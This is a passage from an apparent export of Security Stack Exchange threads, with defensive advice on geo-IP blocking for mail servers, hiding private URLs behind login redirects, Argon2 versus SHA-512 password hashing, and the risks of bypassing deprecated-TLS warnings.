<p>I started thinking about alternatives and one came to mind - what if I could restrict these ports to IPs coming from our own country? That would be reasonably permissive and would allow the users to access their emails during business trips/from mobile networks - while still dropping a lot of the scripted brute force attacks.</p>
<p>I'm not asking how I can achieve set this up, but <strong>how reliable would such setup be in regard to usability</strong>. In other words, I'm afraid of false positives - i.e. legitimate users getting denied access. Are country IP blocks standardised and something I can rely on, or is it common ISPs can distribute IPs locally from other blocks? What about mobile internet providers?</p>
","1","3","262122","<p>I don't know if you can determine if an IP address is used in a given country simply by looking at its prefix.</p>
<p>However, ISPs generally sell the geolocation of their IP addresses and there are databases that map IPs to locations in the world.</p>
<p>If you can get access to the data on one such database or use a service that provides access to some data, you could locally map the IP to its approximate location and see if it belongs to your country.</p>
","2"
"262096","262096","Are country IP address blocks officially standardised and can they be reliably used for access control?","<p>I was setting up <a href=""https://en.wikipedia.org/wiki/Firewalld"" rel=""nofollow noreferrer"">firewalld</a> on an enterprise server and came across their concept of firewall zones. I figured I can easily use them and their <code>source</code> property to restrict access to SSH to only the internal network and my home public IP address. Yes, it is not an extremely strong defense, it's just another layer in front of strong mechanisms and most importantly - it helps declutter the logs.</p>
<p>That got me thinking - the server is a mail server that allows users to read their emails over POP3/IMAP and send them using SMTP Submission among other things. These two ports are regularly subjected to automated brute-force attempts. However, since they need to be used by the users from multiple places, I cannot simply whitelist IPs that can access them like I did with the SSH.</p>
<p>I started thinking about alternatives and one came to mind - what if I could restrict these ports to IPs coming from our own country? That would be reasonably permissive and would allow the users to access their emails during business trips/from mobile networks - while still dropping a lot of the scripted brute force attacks.</p>
<p>I'm not asking how I can achieve set this up, but <strong>how reliable would such setup be in regard to usability</strong>. In other words, I'm afraid of false positives - i.e. legitimate users getting denied access. Are country IP blocks standardised and something I can rely on, or is it common ISPs can distribute IPs locally from other blocks? What about mobile internet providers?</p>
","1","3","262125","<p>Blocks allocated by an certain RIR (Regional Internet Registry), e.g. ARIN, while being allocated to a North American entity can end up being used in another country, it can e.g. happen for an European branch office of an American company.</p>
<p>You can know which prefixes belong to which RIR, i.e. AFRINIC (Africa), APNIC (Asia and Oceania), ARIN (North America minus Mexico), LACNIC (Latin America) and RIPE NCC (Europe, Middle East, Central Asia). Querying whois you can learn  which countries the entities that were allocated the addresses belong to but that won't guarantee that the addresses are actually used in the country or even region they are supposed to. So it's not a reliable indicator.</p>
","1"
"262096","262096","Are country IP address blocks officially standardised and can they be reliably used for access control?","<p>I was setting up <a href=""https://en.wikipedia.org/wiki/Firewalld"" rel=""nofollow noreferrer"">firewalld</a> on an enterprise server and came across their concept of firewall zones. I figured I can easily use them and their <code>source</code> property to restrict access to SSH to only the internal network and my home public IP address. Yes, it is not an extremely strong defense, it's just another layer in front of strong mechanisms and most importantly - it helps declutter the logs.</p>
<p>That got me thinking - the server is a mail server that allows users to read their emails over POP3/IMAP and send them using SMTP Submission among other things. These two ports are regularly subjected to automated brute-force attempts. However, since they need to be used by the users from multiple places, I cannot simply whitelist IPs that can access them like I did with the SSH.</p>
<p>I started thinking about alternatives and one came to mind - what if I could restrict these ports to IPs coming from our own country? That would be reasonably permissive and would allow the users to access their emails during business trips/from mobile networks - while still dropping a lot of the scripted brute force attacks.</p>
<p>I'm not asking how I can achieve set this up, but <strong>how reliable would such setup be in regard to usability</strong>. In other words, I'm afraid of false positives - i.e. legitimate users getting denied access. Are country IP blocks standardised and something I can rely on, or is it common ISPs can distribute IPs locally from other blocks? What about mobile internet providers?</p>
","1","3","262766","<p>To expand on what others have already mentioned, there are IP location databases for sale and some with API access that can be used for this kind of thing (e.g. <a href=""https://ipinfo.io"" rel=""nofollow noreferrer"">ipinfo.io</a>). Cloudflare also provide country detection for free via their web proxy, although you might not be able to use theirs for IMAP/POP3.</p>
<p>From my experience these location databases have reasonably good accuracy for country level (perhaps 80-97% accurate), but relatively poor accuracy for state/city (less than 80%). It's also quite easy for someone to spoof their country by using a VPN. The VPN I use allows me to select from dozens of countries. So this security layer might block 80-90% of unwanted attacks, especially from random bots who will quickly move on, but it won't stop a determined attacker.</p>
<p>Plus, with the poor accuracy you might find the occasional false positive which could frustrate your users, so use with care.</p>
","1"
"262061","262061","Redirect to login page if authorization required -- security flaw?","<p>Suppose we have a site that has public and private areas.  The private areas require login.</p>
<p>For example <em>&quot;www.site.com/about&quot;</em> is publicly accessible. But <em>&quot;www.site.com/message_inbox&quot;</em> requires authorization (valid login).</p>
<p>So what happens when someone who is not logged in, tries to access a private area like <em>&quot;www.site.com/message_inbox&quot;</em>?</p>
<p>It would be terribly confusing for legitimate users to receive a 404 error.  (e.g. imagine refreshing the page after your session expires and seeing a 404).  Therefore, it is convenient for legitimate users if we redirect to a login page.</p>
<p>However, then an attacker could determine whether <em>&quot;www.site.com/some_page&quot;</em> is a legitimate private URL, by seeing if it returns a 404 error or a login page.  Maybe we don't want outsiders to be able to compile a list of valid URLs.</p>
<p>We could attempt to mask this by redirecting ALL requests to the login page, except for the public pages.  But this becomes silly as all junk requests will happily return HTML.</p>
<p>What is the correct solution to this?</p>
","24","9","262062","<p>There is no correct solution as every site has there own things going on,
but I'll give my two cents on how you can tackle this.</p>
<p>Usually sensitive pages are behind a directory or on a separate subdomain which allows you to mask all sensitive pages and others by simply returning a 301 redirect to the login page. So for example <code>/members/home</code> will redirect to <code>/members/login</code>, and so would <code>/members/asadasd</code>, so the attacker won't know the different sensitive pages. If you're able to move everything to this type of structure, it's probably preferable.</p>
<p>As for your case, the best solution is to probably return a 404 if the user is not logged in and is trying to access a sensitive location. This is so the attacker won't be able to enumerate a valid page (e.g., <code>/message_inbox</code>) and a non-valid page (e.g., <code>/asdasasd</code>) as both will return a 404.</p>
<p>As pointed out in the comments, this approach has been suggested in <a href=""https://datatracker.ietf.org/doc/html/rfc7231#section-6.5.3"" rel=""noreferrer"">RFC-7231</a> (Hypertext Transfer Protocol (HTTP/1.1): Semantics and Content):</p>
<blockquote>
<p>An origin server that wishes to &quot;hide&quot; the current existence of a
forbidden target resource MAY instead respond with a status code of
404 (Not Found).</p>
</blockquote>
","25"
"262061","262061","Redirect to login page if authorization required -- security flaw?","<p>Suppose we have a site that has public and private areas.  The private areas require login.</p>
<p>For example <em>&quot;www.site.com/about&quot;</em> is publicly accessible. But <em>&quot;www.site.com/message_inbox&quot;</em> requires authorization (valid login).</p>
<p>So what happens when someone who is not logged in, tries to access a private area like <em>&quot;www.site.com/message_inbox&quot;</em>?</p>
<p>It would be terribly confusing for legitimate users to receive a 404 error.  (e.g. imagine refreshing the page after your session expires and seeing a 404).  Therefore, it is convenient for legitimate users if we redirect to a login page.</p>
<p>However, then an attacker could determine whether <em>&quot;www.site.com/some_page&quot;</em> is a legitimate private URL, by seeing if it returns a 404 error or a login page.  Maybe we don't want outsiders to be able to compile a list of valid URLs.</p>
<p>We could attempt to mask this by redirecting ALL requests to the login page, except for the public pages.  But this becomes silly as all junk requests will happily return HTML.</p>
<p>What is the correct solution to this?</p>
","24","9","262075","<p>The usual thing I have seen is to reload the login page once the session expires.  Like how your bank does &quot;you've been logged out due to inactivity&quot;. This prevents your issue with 404* on refresh.</p>
<ul>
<li>don't return 404 for invalid credentials, it's confusing and may cause the browser to remove a bookmark or something. Return 301 and redirect them to the login page, or 401 unauthorized.</li>
</ul>
","-1"
"262061","262061","Redirect to login page if authorization required -- security flaw?","<p>Suppose we have a site that has public and private areas.  The private areas require login.</p>
<p>For example <em>&quot;www.site.com/about&quot;</em> is publicly accessible. But <em>&quot;www.site.com/message_inbox&quot;</em> requires authorization (valid login).</p>
<p>So what happens when someone who is not logged in, tries to access a private area like <em>&quot;www.site.com/message_inbox&quot;</em>?</p>
<p>It would be terribly confusing for legitimate users to receive a 404 error.  (e.g. imagine refreshing the page after your session expires and seeing a 404).  Therefore, it is convenient for legitimate users if we redirect to a login page.</p>
<p>However, then an attacker could determine whether <em>&quot;www.site.com/some_page&quot;</em> is a legitimate private URL, by seeing if it returns a 404 error or a login page.  Maybe we don't want outsiders to be able to compile a list of valid URLs.</p>
<p>We could attempt to mask this by redirecting ALL requests to the login page, except for the public pages.  But this becomes silly as all junk requests will happily return HTML.</p>
<p>What is the correct solution to this?</p>
","24","9","262080","<p>What is your threat model?</p>
<p>With a blanket approach you won't solve your use case. Correct, if you do as you describe you allow an attacker to enumerate your valid pages, theoretically. Does he have an advantage doing so? Do you have a possible attack vector that requires him to have knowledge of valid pages? Would your app leak information through such an enumeration?</p>
<p>These are the questions to ask. Once you have the answers, you can calculate the trade-off between user-friendliness and security.</p>
<blockquote>
<p>Maybe we don't want outsiders to be able to compile a list of valid
URLs.</p>
</blockquote>
<p>The question &quot;why?&quot; is asked not often enough in InfoSec. We have a bunch of &quot;best practices&quot;, most of which are really based on &quot;everyone I asked thinks that's a good idea&quot;. Take the password complexity disaster where we've told users for decades something that's simply wrong. And it'll take us at least another decade to get all those silly complexity rules encoded into software and security policies out of the system.</p>
<p>Never stop with &quot;maybe we don't want&quot;. Ask what the <strong>actual</strong> threat behind it is that you are trying to prevent.</p>
","57"
"262061","262061","Redirect to login page if authorization required -- security flaw?","<p>Suppose we have a site that has public and private areas.  The private areas require login.</p>
<p>For example <em>&quot;www.site.com/about&quot;</em> is publicly accessible. But <em>&quot;www.site.com/message_inbox&quot;</em> requires authorization (valid login).</p>
<p>So what happens when someone who is not logged in, tries to access a private area like <em>&quot;www.site.com/message_inbox&quot;</em>?</p>
<p>It would be terribly confusing for legitimate users to receive a 404 error.  (e.g. imagine refreshing the page after your session expires and seeing a 404).  Therefore, it is convenient for legitimate users if we redirect to a login page.</p>
<p>However, then an attacker could determine whether <em>&quot;www.site.com/some_page&quot;</em> is a legitimate private URL, by seeing if it returns a 404 error or a login page.  Maybe we don't want outsiders to be able to compile a list of valid URLs.</p>
<p>We could attempt to mask this by redirecting ALL requests to the login page, except for the public pages.  But this becomes silly as all junk requests will happily return HTML.</p>
<p>What is the correct solution to this?</p>
","24","9","262082","<p>The solution to this is to redirect anything that is not a public resource to the login URL, including nonexistent pages.</p>
","-3"
"262061","262061","Redirect to login page if authorization required -- security flaw?","<p>Suppose we have a site that has public and private areas.  The private areas require login.</p>
<p>For example <em>&quot;www.site.com/about&quot;</em> is publicly accessible. But <em>&quot;www.site.com/message_inbox&quot;</em> requires authorization (valid login).</p>
<p>So what happens when someone who is not logged in, tries to access a private area like <em>&quot;www.site.com/message_inbox&quot;</em>?</p>
<p>It would be terribly confusing for legitimate users to receive a 404 error.  (e.g. imagine refreshing the page after your session expires and seeing a 404).  Therefore, it is convenient for legitimate users if we redirect to a login page.</p>
<p>However, then an attacker could determine whether <em>&quot;www.site.com/some_page&quot;</em> is a legitimate private URL, by seeing if it returns a 404 error or a login page.  Maybe we don't want outsiders to be able to compile a list of valid URLs.</p>
<p>We could attempt to mask this by redirecting ALL requests to the login page, except for the public pages.  But this becomes silly as all junk requests will happily return HTML.</p>
<p>What is the correct solution to this?</p>
","24","9","262083","<p>I don't think this is a serious flaw (see <a href=""https://security.stackexchange.com/a/262080/72452"">Tom's answer</a>).</p>
<p>However, if you think it is, the problem can be avoided.</p>
<p>You have a list of &quot;publicly available URLs&quot;, such as <em>/about</em>.</p>
<p>For <strong>all</strong> other URLs, you should give a 302 to a login page whether the requested page exists or not.  Only after the user logs in should you give a 404 if relevant.</p>
<p>This way, the redirect does not give intruders any information at all.</p>
","20"
"262061","262061","Redirect to login page if authorization required -- security flaw?","<p>Suppose we have a site that has public and private areas.  The private areas require login.</p>
<p>For example <em>&quot;www.site.com/about&quot;</em> is publicly accessible. But <em>&quot;www.site.com/message_inbox&quot;</em> requires authorization (valid login).</p>
<p>So what happens when someone who is not logged in, tries to access a private area like <em>&quot;www.site.com/message_inbox&quot;</em>?</p>
<p>It would be terribly confusing for legitimate users to receive a 404 error.  (e.g. imagine refreshing the page after your session expires and seeing a 404).  Therefore, it is convenient for legitimate users if we redirect to a login page.</p>
<p>However, then an attacker could determine whether <em>&quot;www.site.com/some_page&quot;</em> is a legitimate private URL, by seeing if it returns a 404 error or a login page.  Maybe we don't want outsiders to be able to compile a list of valid URLs.</p>
<p>We could attempt to mask this by redirecting ALL requests to the login page, except for the public pages.  But this becomes silly as all junk requests will happily return HTML.</p>
<p>What is the correct solution to this?</p>
","24","9","262095","<p>The correct solution is to issue the redirect regardless of the status of the target URL if the user is not authenticated. This is easily doable for any normal web server (you set up a redirect rule to match on the common prefix for all the sensitive pages that also checks for the existence of the session credentials), provides good UX for legitimate users, and avoids the issue of potentially disclosing the existence of specific URLs.</p>
<p>Note that when I say ‘redirect’ here I mean sending a 302 status code (<em>not</em> a 301 like some of the other answers suggest, a permanent redirect is <em>not</em> correct here) with a <code>Location</code> header pointing at the login page, and ideally set things up to return the user to the desired page after login. This method avoids sending the login page if the client doesn’t actually follow the redirect, and also allows the login page to be <em>cached</em> (unlike doing silly things like URL rewrites or having the web app throw up different HTML depending on the authentication status), which should mitigate any usage issues from people trying to do URL harvesting.</p>
<p>If you really do not want to redirect to a login page, then you should return a 403 status code for all unauthenticated requests instead (and possibly use a custom error page with a link to the login page). This is the HTTP equivalent of a ‘Permission denied’ message, so unlike a 404 it accurately describes the actual error.</p>
<p>The important thing here is that regardless of which status code you choose, you return it <em>uniformly</em> for <em>all</em> secure URLs when an unauthenticated user attempts to access them. By making the response uniform, you avoid the risk of information disclosure, and it just comes down to <em>how</em> you want to respond.</p>
<hr />
<p>What I describe above is the standard approach in most modern web apps when the default assumption is that the resource the user is asking for actually exists. If, instead, the default assumption is that the resource does not exist (this is the case for example with GitHub’s handling of private repositories), then the more correct behavior is to just return a 404 for all private URLs for unauthenticated users.</p>
","9"
"262061","262061","Redirect to login page if authorization required -- security flaw?","<p>Suppose we have a site that has public and private areas.  The private areas require login.</p>
<p>For example <em>&quot;www.site.com/about&quot;</em> is publicly accessible. But <em>&quot;www.site.com/message_inbox&quot;</em> requires authorization (valid login).</p>
<p>So what happens when someone who is not logged in, tries to access a private area like <em>&quot;www.site.com/message_inbox&quot;</em>?</p>
<p>It would be terribly confusing for legitimate users to receive a 404 error.  (e.g. imagine refreshing the page after your session expires and seeing a 404).  Therefore, it is convenient for legitimate users if we redirect to a login page.</p>
<p>However, then an attacker could determine whether <em>&quot;www.site.com/some_page&quot;</em> is a legitimate private URL, by seeing if it returns a 404 error or a login page.  Maybe we don't want outsiders to be able to compile a list of valid URLs.</p>
<p>We could attempt to mask this by redirecting ALL requests to the login page, except for the public pages.  But this becomes silly as all junk requests will happily return HTML.</p>
<p>What is the correct solution to this?</p>
","24","9","262099","<p>I agree with <a href=""https://security.stackexchange.com/questions/262061/redirect-to-login-page-if-authorization-required-security-flaw/262080#262080"">Tom's answer</a> that this seems like a bizarre threat model.</p>
<p>Worrying about attackers enumerating static URLs implies that:</p>
<ul>
<li>The web app is on the internet (or at least accessible to attackers, ie not on a private network)</li>
<li>It is difficult to get an account; ie no free trials or demo instances for attackers to play with.</li>
<li>Knowing the static URLs somehow leads to the attacker being able to do bad things (this is the core of Tom's answer).</li>
<li>And finally: there is no easier way for an attacker to learn the URLs, for example by analyzing your javascript code or links in the public HTML pages. I suppose it's possible that the public pages only have links to other public pages, and that you have separate javascript files for the public and private parts of your app, but I've personally never seen an app built that way.</li>
</ul>
<p>TL;DR this seems like an odd thing to want to do. I would suggest instead following <a href=""https://en.wikipedia.org/wiki/Kerckhoffs%27s_principle"" rel=""nofollow noreferrer"">Kerckhoff's Principle</a> and designing your web app so that it is secure <em>even if</em> an attacker knows everything about its design (HTML, javascript, static URLs, etc).</p>
<hr />
<p>UPDATE addressing JimmyJames' comment.</p>
<p>If you have dynamic URLs like <code>/users/&lt;username&gt;</code> or <code>/device/&lt;deviceId&gt;</code>, then it makes sense to return a 404 so that the following are indistinguishable:</p>
<ul>
<li>URL does not exist.</li>
<li>URL exists but you don't have permission to see it.</li>
</ul>
<p>However, since your example was <code>www.site.com/message_inbox</code>, I assume you're not talking about dynamic URLs though.</p>
","3"
"262061","262061","Redirect to login page if authorization required -- security flaw?","<p>Suppose we have a site that has public and private areas.  The private areas require login.</p>
<p>For example <em>&quot;www.site.com/about&quot;</em> is publicly accessible. But <em>&quot;www.site.com/message_inbox&quot;</em> requires authorization (valid login).</p>
<p>So what happens when someone who is not logged in, tries to access a private area like <em>&quot;www.site.com/message_inbox&quot;</em>?</p>
<p>It would be terribly confusing for legitimate users to receive a 404 error.  (e.g. imagine refreshing the page after your session expires and seeing a 404).  Therefore, it is convenient for legitimate users if we redirect to a login page.</p>
<p>However, then an attacker could determine whether <em>&quot;www.site.com/some_page&quot;</em> is a legitimate private URL, by seeing if it returns a 404 error or a login page.  Maybe we don't want outsiders to be able to compile a list of valid URLs.</p>
<p>We could attempt to mask this by redirecting ALL requests to the login page, except for the public pages.  But this becomes silly as all junk requests will happily return HTML.</p>
<p>What is the correct solution to this?</p>
","24","9","262110","<h2>Use status 404.5 - Not Found + Denied by request filtering</h2>
<p>You can return HTTP status 404.5 &quot;Denied by request filtering.&quot; This is accurate since your site denies any requests to non-public URLs based on a business rule (user must be authenticated). Since it's a 404.x message it also makes sense to serve it for URLs that do not exist.</p>
<p>For the convenience of your legitimate users, you can configure your server to serve a custom page for status 404.5, and include a link to the login page from there. That way the browser is not loading the login page (which could have side effects) arbitrarily for garbage URLs. Only when the user clicks the link would the login page be served. The custom 404.5 page can be static HTML and can be set to cache so it is only loaded by the browser once.</p>
","2"
"262061","262061","Redirect to login page if authorization required -- security flaw?","<p>Suppose we have a site that has public and private areas.  The private areas require login.</p>
<p>For example <em>&quot;www.site.com/about&quot;</em> is publicly accessible. But <em>&quot;www.site.com/message_inbox&quot;</em> requires authorization (valid login).</p>
<p>So what happens when someone who is not logged in, tries to access a private area like <em>&quot;www.site.com/message_inbox&quot;</em>?</p>
<p>It would be terribly confusing for legitimate users to receive a 404 error.  (e.g. imagine refreshing the page after your session expires and seeing a 404).  Therefore, it is convenient for legitimate users if we redirect to a login page.</p>
<p>However, then an attacker could determine whether <em>&quot;www.site.com/some_page&quot;</em> is a legitimate private URL, by seeing if it returns a 404 error or a login page.  Maybe we don't want outsiders to be able to compile a list of valid URLs.</p>
<p>We could attempt to mask this by redirecting ALL requests to the login page, except for the public pages.  But this becomes silly as all junk requests will happily return HTML.</p>
<p>What is the correct solution to this?</p>
","24","9","262134","<blockquote>
<p>We could attempt to mask this by redirecting ALL requests to the login page, except for the public pages. But this becomes silly as all junk requests will happily return HTML.</p>
</blockquote>
<p>You are trying to keep the attacker from knowing what private pages are available without authenticating. This means existing and non-existing pages must return identical results. Therefore, you authenticate first, and handle the 404 after.</p>
<p>There's nothing silly about returning HTML for non-existing pages - that's implied by your desired behavior. Some websites do things like put everything that requires auth below a path like <code>example.com/private/...</code> so that the client does not expect to get a 404 right away for things under <code>private/</code>. Moreover, this &quot;silly&quot; problem goes away as soon as you authenticate.</p>
<p>This is a standard pattern in access control. Before you can see what resources are available, you must first authenticate. If you're not authed, you can't distinguish &quot;does not exist&quot; from &quot;not allowed to access&quot;.</p>
","2"
"261902","261902","Argon2 vs SHA-512, what's better in my case?","<p>First I am very bad in cryptographic algorithms.</p>
<p>I found online that <strong>Argon2</strong> is more secure than <strong>SHA-512</strong>, so I used it for password hashing.</p>
<p>There're recommended options for <strong>Argon2</strong>:</p>
<ul>
<li>Memory: 4Gb</li>
<li>Iterations: 4 or more</li>
</ul>
<p>On my ancient server it takes a little less than infinity for 100 users... So, I've decreased options to:</p>
<ul>
<li>Memory: 100Mb</li>
<li>Iterations: 3</li>
<li>Threads: 4 (if it's important)</li>
<li>Type: Argon2i (recommended for password hashes)</li>
<li>Salt size: 20 bytes</li>
</ul>
<p>These options are significantly lower than options that I found as recommended. So I was wondering...</p>
<p>Will <strong>Argon2</strong> with my options still be more secure than <strong>SHA-512</strong>? Or should I switch back to <strong>SHA-512</strong>?</p>
<p><strong>P.S.</strong> If my question is not clear, text me, plz, I will try to reformulate it</p>
","11","3","261904","<p>Argon2 is intentionally slow: <em>slow-hashing functions</em> are good for storing passwords, because it is time/resource consuming to crack them. In the case of Argon2, the hashing consumes memory, too. The tradeoff in your fine-tuning is that your hardware can calculate the hashes a bit faster, and an attacker would have the same advance to the same extent. Also, you just have to consume the resources once per login attempt or password creation, while someone cracking the hash must do it per every single try.</p>
<p>On the other hand, SHA-512 is not designed for storing passwords. Not only that it is faster on the hardware in question, but SHA-512 is way faster to calculate on GPU or specialized hardware, whereas Argon2 does not have this weakness.</p>
","17"
"261902","261902","Argon2 vs SHA-512, what's better in my case?","<p>First I am very bad in cryptographic algorithms.</p>
<p>I found online that <strong>Argon2</strong> is more secure than <strong>SHA-512</strong>, so I used it for password hashing.</p>
<p>There're recommended options for <strong>Argon2</strong>:</p>
<ul>
<li>Memory: 4Gb</li>
<li>Iterations: 4 or more</li>
</ul>
<p>On my ancient server it takes a little less than infinity for 100 users... So, I've decreased options to:</p>
<ul>
<li>Memory: 100Mb</li>
<li>Iterations: 3</li>
<li>Threads: 4 (if it's important)</li>
<li>Type: Argon2i (recommended for password hashes)</li>
<li>Salt size: 20 bytes</li>
</ul>
<p>These options are significantly lower than options that I found as recommended. So I was wondering...</p>
<p>Will <strong>Argon2</strong> with my options still be more secure than <strong>SHA-512</strong>? Or should I switch back to <strong>SHA-512</strong>?</p>
<p><strong>P.S.</strong> If my question is not clear, text me, plz, I will try to reformulate it</p>
","11","3","261925","<p>Argon2 tuned to the max delay you can stand, if you must choose between the two - but the better answer may be: neither.</p>
<p>Multiple judges for <a href=""https://www.password-hashing.net/"" rel=""nofollow noreferrer"">the Password Hashing Competition</a> - that selected the Argon2 family as its winner - have since <a href=""https://twitter.com/jmgosney/status/1111865772656246786"" rel=""nofollow noreferrer"">acknowledged</a> that once you tune Argon2 to be as responsive as indicated by UX studies for interactive authentication (&lt;=500ms), it's actually worse than bcrypt from a defense perspective (better for the attacker, worse for the defender). This is because at those tuning levels, Argon2 is less resistant to parallel attack than bcrypt is when tuned to the same responsiveness.</p>
<p>So as long as you're OK with bcrypt's other limitations (max 72 characters, and <a href=""https://blog.ircmaxell.com/2015/03/security-issue-combining-bcrypt-with.html"" rel=""nofollow noreferrer"">avoiding nesting</a>), bcrypt may still be a better choice, depending on your scale and threat model.</p>
<p>And either would be a better choice than both raw SHA-512 (because even high iterations don't sufficiently reduce parallelism) or sha512crypt (because it has <a href=""https://pthree.org/2018/05/23/do-not-use-sha256crypt-sha512crypt-theyre-dangerous/"" rel=""nofollow noreferrer"">its own issues</a>).</p>
<p>Edit: <a href=""https://www.reddit.com/r/crypto/comments/l395nj/argon2_is_weaker_than_bcrypt_for_runtimes_1000ms/gkhcgtq/"" rel=""nofollow noreferrer"">some benchmarks</a> that one of the other PHC judges (Steve Thomas) posted to support this claim.</p>
","12"
"261902","261902","Argon2 vs SHA-512, what's better in my case?","<p>First I am very bad in cryptographic algorithms.</p>
<p>I found online that <strong>Argon2</strong> is more secure than <strong>SHA-512</strong>, so I used it for password hashing.</p>
<p>There're recommended options for <strong>Argon2</strong>:</p>
<ul>
<li>Memory: 4Gb</li>
<li>Iterations: 4 or more</li>
</ul>
<p>On my ancient server it takes a little less than infinity for 100 users... So, I've decreased options to:</p>
<ul>
<li>Memory: 100Mb</li>
<li>Iterations: 3</li>
<li>Threads: 4 (if it's important)</li>
<li>Type: Argon2i (recommended for password hashes)</li>
<li>Salt size: 20 bytes</li>
</ul>
<p>These options are significantly lower than options that I found as recommended. So I was wondering...</p>
<p>Will <strong>Argon2</strong> with my options still be more secure than <strong>SHA-512</strong>? Or should I switch back to <strong>SHA-512</strong>?</p>
<p><strong>P.S.</strong> If my question is not clear, text me, plz, I will try to reformulate it</p>
","11","3","261935","<p>The other answers have already explained why Argon2d is better than SHA512 for password hashing, but I'd like to share some experience on tuning Argon2 for web server.</p>
<ul>
<li>First, pick the Argon2 variant. Although the spec said <code>Argon2i uses data-independent memory access, which is preferred for password hashing and password-based key derivation</code>, I prefer <code>Argon2id</code> because it provides a balance resistance to both side-channel and GPU-based attacks</li>
<li>Second, pick the memory requirement, since a web server need to serve multiple users at the same time. <a href=""https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html#argon2id"" rel=""nofollow noreferrer"">OWAPS's guideline</a> recommend a minimum of <code>19MB</code>, but you can use a lower number without reducing security by increasing the number of iteration.</li>
<li>Third, pick the number of threads/degree of parallelism: <code>1</code> is a safe bet, since the web server should already use multiple threads to serve requests.</li>
<li>Forth, pick the number of iteration, the higher number the better, as long as the verification speed is not too slow for you. The rule is the lower amount of memory you want, the higher iteration counts you will need to achieve the same level of security.</li>
<li>For salt size and output size, just use your hashing library's default value. If you want to customize, a <code>16 bytes salt size</code> and <code>32 bytes output size</code> is good enough.</li>
</ul>
","2"
"261890","261890","Is it safe to ignore/override TLS warnings if user doesn't enter passwords or other data?","<p>A user is trying to access a poorly maintained website using a modern OS (Windows 10) and web browser (Firefox 100.0). They want to download something from there, but they are seeing a security warning indicating that the host is using a deprecated TLS protocol version and/or has an issue with its certificate. The user been in touch with the person who owns the domain and downloadable content, and this person is being slow to get it fixed.</p>
<p><strong>Questions:</strong></p>
<ol>
<li>Can the user (re-)enable old TLS protocol versions for this site in Firefox (<code>security.tls.version.enable-deprecated = FALSE</code>), and safely browse &amp; download content as long as they avoid entering data such as credit card numbers, passwords, etc.?</li>
<li>Or does simply browsing a site using old TLS versions itself carry inherent risks?</li>
<li>If the latter, is there a way for them to reasonably mitigate these risks? (By reasonable, I mean without configuring network/firewall settings, using a container, etc.)</li>
</ol>
<p>They are considering firing up an old Windows XP computer running an also-old Internet Explorer, which I'm open to letting them do, as long as they don't share their data on the network and take the device offline as soon as they are done. LMK if you can think of any reasons why this would be a bad idea.</p>
<p>I looked for answers on Firefox forums, this forum, and via a general web search, but I didn't find anything useful.</p>
","27","5","261891","<p>Yes, you need TLS for read only websites. Because otherwise a rogue WiFi hotspot can serve whatever content it wants on your domain and the user has no way to know it's not authentic. Also, browsers disable features on non-secure websites and display increasingly scary warnings about the website being insecure. So just set up let's encrypt with automatic renewal.</p>
","9"
"261890","261890","Is it safe to ignore/override TLS warnings if user doesn't enter passwords or other data?","<p>A user is trying to access a poorly maintained website using a modern OS (Windows 10) and web browser (Firefox 100.0). They want to download something from there, but they are seeing a security warning indicating that the host is using a deprecated TLS protocol version and/or has an issue with its certificate. The user been in touch with the person who owns the domain and downloadable content, and this person is being slow to get it fixed.</p>
<p><strong>Questions:</strong></p>
<ol>
<li>Can the user (re-)enable old TLS protocol versions for this site in Firefox (<code>security.tls.version.enable-deprecated = FALSE</code>), and safely browse &amp; download content as long as they avoid entering data such as credit card numbers, passwords, etc.?</li>
<li>Or does simply browsing a site using old TLS versions itself carry inherent risks?</li>
<li>If the latter, is there a way for them to reasonably mitigate these risks? (By reasonable, I mean without configuring network/firewall settings, using a container, etc.)</li>
</ol>
<p>They are considering firing up an old Windows XP computer running an also-old Internet Explorer, which I'm open to letting them do, as long as they don't share their data on the network and take the device offline as soon as they are done. LMK if you can think of any reasons why this would be a bad idea.</p>
<p>I looked for answers on Firefox forums, this forum, and via a general web search, but I didn't find anything useful.</p>
","27","5","261892","<p>You need TLS, no excuses.</p>
<p>Even if the user isn't sending anything confidential to the site, they are downloading from it. Any attacker in the position to perform a MitM attack will be able to change any resource from the site and the clients cannot detect the attack.</p>
<p>What kinds of resources? For example, the attacker may replace every page with a message &quot;This site needs <strong>Flash Plugin 14.5.6.7.8.9rev114</strong> to run, click here to download.&quot; and most users will happily download the file.</p>
<p>The attacker can download the entire traffic and get all files downloaded by the users. The attacker can redirect users to another site, can backdoor any file.</p>
<p>Today, TLS certificates are free, easy to install, and even automated. <a href=""https://letsencrypt.org"" rel=""noreferrer"">Let's Encrypt</a> for example is one of those.</p>
","10"
"261890","261890","Is it safe to ignore/override TLS warnings if user doesn't enter passwords or other data?","<p>A user is trying to access a poorly maintained website using a modern OS (Windows 10) and web browser (Firefox 100.0). They want to download something from there, but they are seeing a security warning indicating that the host is using a deprecated TLS protocol version and/or has an issue with its certificate. The user been in touch with the person who owns the domain and downloadable content, and this person is being slow to get it fixed.</p>
<p><strong>Questions:</strong></p>
<ol>
<li>Can the user (re-)enable old TLS protocol versions for this site in Firefox (<code>security.tls.version.enable-deprecated = FALSE</code>), and safely browse &amp; download content as long as they avoid entering data such as credit card numbers, passwords, etc.?</li>
<li>Or does simply browsing a site using old TLS versions itself carry inherent risks?</li>
<li>If the latter, is there a way for them to reasonably mitigate these risks? (By reasonable, I mean without configuring network/firewall settings, using a container, etc.)</li>
</ol>
<p>They are considering firing up an old Windows XP computer running an also-old Internet Explorer, which I'm open to letting them do, as long as they don't share their data on the network and take the device offline as soon as they are done. LMK if you can think of any reasons why this would be a bad idea.</p>
<p>I looked for answers on Firefox forums, this forum, and via a general web search, but I didn't find anything useful.</p>
","27","5","261898","<p>Of course the site should upgrade its TLS setup.  But, until the site owner does that, the user that needs to download the file from the site must look for a workaround.</p>
<p>The user can proceed to download the file - either by using http instead of https if the site allows it, or ignoring the browser's TLS / certificate warnings and proceeding anyway, or by using an older operating system from the same vintage as the site's TLS setup, or by using a command line tool such as <code>curl</code> or <code>wget</code>, or another method.  But, as others have mentioned, <strong>a man in the middle (MITM) would be in a position to impersonate the site, and serve the user a malicious file instead of the true and correct file</strong>.</p>
<p>To mitigate this problem, the user would be well advised to verify the integrity of the file, by taking a checksum hash of the file after downloading it, and ensuring that it matches the known correct checksum for the file.</p>
<hr />
<p>Related:</p>
<p><a href=""https://security.stackexchange.com/questions/226317/are-downloads-from-http-connections-safe/226325"">Are downloads from http connections safe?</a></p>
